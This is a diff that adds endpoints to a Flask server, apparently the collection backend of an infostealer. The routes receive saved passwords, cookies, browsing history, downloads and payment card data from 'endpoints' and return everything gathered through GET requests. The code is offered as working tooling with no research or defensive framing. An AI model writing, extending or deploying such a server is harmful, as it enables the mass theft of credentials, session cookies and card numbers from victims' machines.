@@ -2208,3 +2208,120 @@ if __name__ == '__main__':
     print()
     
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+
+# ===== ENDPOINTS PARA DADOS DE NAVEGADORES =====
+
+@app.route('/api/browser_data', methods=['POST'])
+def receive_browser_data():
+    data = request.get_json()
+    endpoint_id = data.get('endpoint_id', 'unknown')
+    
+    if endpoint_id not in endpoints:
+        endpoints[endpoint_id] = {}
+    
+    endpoints[endpoint_id]['browser_data'] = data
+    endpoints[endpoint_id]['last_seen'] = datetime.now().isoformat()
+    
+    return jsonify({'status': 'success'})
+
+@app.route('/api/passwords_data', methods=['GET', 'POST'])
+def passwords_data():
+    if request.method == 'POST':
+        data = request.get_json()
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        if endpoint_id not in endpoints:
+            endpoints[endpoint_id] = {}
+        if 'passwords' not in endpoints[endpoint_id]:
+            endpoints[endpoint_id]['passwords'] = []
+        endpoints[endpoint_id]['passwords'].extend(data.get('passwords', []))
+        return jsonify({'status': 'success'})
+    
+    # GET - retorna todas as senhas
+    all_passwords = []
+    for ep_id, ep_data in endpoints.items():
+        if 'passwords' in ep_data:
+            for pwd in ep_data['passwords']:
+                pwd['endpoint_id'] = ep_id
+                all_passwords.append(pwd)
+    return jsonify(all_passwords)
+
+@app.route('/api/cookies_data', methods=['GET', 'POST'])
+def cookies_data():
+    if request.method == 'POST':
+        data = request.get_json()
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        if endpoint_id not in endpoints:
+            endpoints[endpoint_id] = {}
+        if 'cookies' not in endpoints[endpoint_id]:
+            endpoints[endpoint_id]['cookies'] = []
+        endpoints[endpoint_id]['cookies'].extend(data.get('cookies', []))
+        return jsonify({'status': 'success'})
+    
+    all_cookies = []
+    for ep_id, ep_data in endpoints.items():
+        if 'cookies' in ep_data:
+            for cookie in ep_data['cookies']:
+                cookie['endpoint_id'] = ep_id
+                all_cookies.append(cookie)
+    return jsonify(all_cookies)
+
+@app.route('/api/history_data', methods=['GET', 'POST'])
+def history_data():
+    if request.method == 'POST':
+        data = request.get_json()
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        if endpoint_id not in endpoints:
+            endpoints[endpoint_id] = {}
+        if 'history' not in endpoints[endpoint_id]:
+            endpoints[endpoint_id]['history'] = []
+        endpoints[endpoint_id]['history'].extend(data.get('history', []))
+        return jsonify({'status': 'success'})
+    
+    all_history = []
+    for ep_id, ep_data in endpoints.items():
+        if 'history' in ep_data:
+            for hist in ep_data['history']:
+                hist['endpoint_id'] = ep_id
+                all_history.append(hist)
+    return jsonify(all_history)
+
+@app.route('/api/downloads_data', methods=['GET', 'POST'])
+def downloads_data():
+    if request.method == 'POST':
+        data = request.get_json()
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        if endpoint_id not in endpoints:
+            endpoints[endpoint_id] = {}
+        if 'downloads' not in endpoints[endpoint_id]:
+            endpoints[endpoint_id]['downloads'] = []
+        endpoints[endpoint_id]['downloads'].extend(data.get('downloads', []))
+        return jsonify({'status': 'success'})
+    
+    all_downloads = []
+    for ep_id, ep_data in endpoints.items():
+        if 'downloads' in ep_data:
+            for dl in ep_data['downloads']:
+                dl['endpoint_id'] = ep_id
+                all_downloads.append(dl)
+    return jsonify(all_downloads)
+
+@app.route('/api/cards_data', methods=['GET', 'POST'])
+def cards_data():
+    if request.method == 'POST':
+        data = request.get_json()
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        if endpoint_id not in endpoints:
+            endpoints[endpoint_id] = {}
+        if 'cards' not in endpoints[endpoint_id]:
+            endpoints[endpoint_id]['cards'] = []
+        endpoints[endpoint_id]['cards'].extend(data.get('cards', []))
+        return jsonify({'status': 'success'})
+    
+    all_cards = []
+    for ep_id, ep_data in endpoints.items():
+        if 'cards' in ep_data:
+            for card in ep_data['cards']:
+                card['endpoint_id'] = ep_id
+                all_cards.append(card)
+    return jsonify(all_cards)
+
